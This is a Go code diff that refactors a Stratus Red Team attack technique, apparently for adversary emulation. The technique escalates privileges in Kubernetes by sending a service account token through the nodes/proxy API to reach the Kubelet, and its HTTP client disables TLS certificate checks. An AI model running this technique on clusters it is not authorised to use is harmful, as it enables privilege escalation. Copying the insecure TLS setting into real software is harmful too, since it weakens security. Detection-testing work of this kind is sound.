@@ -8,11 +8,13 @@ import (
 	"fmt"
 	"github.com/datadog/stratus-red-team/v2/internal/providers"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus/domain"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
 	"io"
 	authenticationv1 "k8s.io/api/authentication/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/client-go/kubernetes"
+	"k8s.io/client-go/rest"
 	"log"
 	"net/http"
 	"strconv"
@@ -25,10 +27,10 @@ func init() {
 	const codeBlock = "```"
 	const code = "`"
 
-	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
+	stratus.GetRegistry().RegisterAttackTechnique(&domain.AttackTechnique{
 		ID:                 "k8s.privilege-escalation.nodes-proxy",
 		FriendlyName:       "Privilege escalation through node/proxy permissions",
-		Platform:           stratus.Kubernetes,
+		Platform:           domain.Kubernetes,
 		IsIdempotent:       true,
 		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
 		Description: `
@@ -92,8 +94,8 @@ See [kubeletctl](https://github.com/cyberark/kubeletctl/blob/master/pkg/api/cons
 	})
 }
 
-func detonate(params map[string]string) error {
-	client := providers.K8s().GetClient()
+func detonate(providers domain.ProvidersFactory, params map[string]string) error {
+	client := providers.GetK8sProvider().GetClient()
 	serviceAccountName := params["service_account_name"]
 	serviceAccountNamespace := params["service_account_namespace"]
 
@@ -112,7 +114,7 @@ func detonate(params map[string]string) error {
 
 	// Step 3: Proxy the request to the Kubelet through this node
 	log.Println("Using worker node '" + node + "' to proxy to the Kubelet API")
-	_, err = proxyKubeletRequest("/runningpods/", authenticationToken, node, client)
+	_, err = proxyKubeletRequest(providers.GetK8sProvider().GetRestConfig(), "/runningpods/", authenticationToken, node, client)
 	if err != nil {
 		return err
 	}
@@ -144,16 +146,15 @@ func getRandomNodeName(client *kubernetes.Clientset) (string, error) {
 
 // Uses the nodes proxy API to proxy a request through a node to hit the Kubelet
 // see https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/#-strong-proxy-operations-node-v1-core-strong-
-func proxyKubeletRequest(kubeletApiPath string, token string, node string, client *kubernetes.Clientset) (string, error) {
+func proxyKubeletRequest(restConfig *rest.Config, kubeletApiPath string, token string, node string, client *kubernetes.Clientset) (string, error) {
 	// Note: We have to use a raw HTTP request because it's not straightforward to create a new K8s API client from
 	// a static bearer token
-	config := providers.K8s().GetRestConfig()
 	httpClient := &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
 	}
-	apiServerUrl := fmt.Sprintf("%s/%s", config.Host, config.APIPath)
+	apiServerUrl := fmt.Sprintf("%s/%s", restConfig.Host, restConfig.APIPath)
 	endpointUrl := fmt.Sprintf("%sapi/v1/nodes/%s/proxy%s", apiServerUrl, node, kubeletApiPath)
 	req, _ := http.NewRequest("GET", endpointUrl, nil)
 	req.Header.Set("Authorization", "Bearer "+token)
